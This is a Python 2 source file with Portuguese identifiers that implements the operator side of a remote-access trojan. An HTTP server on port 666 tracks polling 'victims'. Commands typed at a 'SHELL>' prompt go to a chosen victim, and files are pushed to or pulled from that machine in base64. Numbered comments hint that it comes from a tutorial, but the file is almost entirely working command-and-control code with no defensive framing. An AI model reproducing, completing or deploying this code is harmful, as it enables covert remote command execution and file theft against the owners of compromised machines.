from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import os, base64, threading, time

class MeuServidor(BaseHTTPRequestHandler):

    def do_GET(self):
        global comando, vitima, vitimas, download #1
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.end_headers()
        if self.path[1:] not in vitimas: #2
            vitimas.append(self.path[1:])
        if self.path[1:] != vitima: #3
            self.wfile.write("time.sleep(5)") #4
        else: #5
            if comando.startswith("upload"):
                arquivo = comando.split()[1]
                with open(arquivo, "rb") as conteudo:
                    conteudoArquivo = conteudo.read()
                self.wfile.write("upload %s %s" %(os.path.basename(arquivo),
                                    base64.b64encode(conteudoArquivo)))
            elif comando.startswith("download"):
                download = os.path.basename(comando.split()[1])
                self.wfile.write(comando)
            else:
                self.wfile.write(comando)

    def do_POST(self):
        global comando, download
        comando = "" #6
        tamanho = int(self.headers["Content-Length"])
        corpoPOST = self.rfile.read(tamanho)
        self.send_response(200)
        self.end_headers()
        if "/download" in self.path:
            with open(download, "wb") as conteudo:
                conteudo.write(base64.b64decode(corpoPOST))
            print "\nDownload completo"
        else:
            print "\n" + corpoPOST

    def log_message(self, *args):
        return

comando, vitima, download = "", "", "" #7
vitimas = [] #8

def inicia_servidor():
    servidor = HTTPServer(("0.0.0.0", 666), MeuServidor)
    servidor.serve_forever()
threading.Thread(target=inicia_servidor).start()

def ajuda():
    print
    print "*" * 30
    print "(a)juda"
    print "(l)istar vitimas"
    print "(s)elecionar vitima"
    print "(e)nviar comando"
    print "*" * 30

ajuda()
while True: #9
    opcao = raw_input("\nO que voce deseja fazer? ")

    if opcao == "a":
        ajuda()

    elif opcao == "l":
        for x in vitimas:
            print x

    elif opcao == "s":
        vitima = raw_input("Digite a vitima: ")

    elif opcao == "e":
        comando = raw_input("SHELL> ")
        if comando.startswith("download"):
            print "\nRealizando o download. Aguarde..."
        elif comando.startswith("upload"):
            print "\nRealizando o upload. Aguarde..."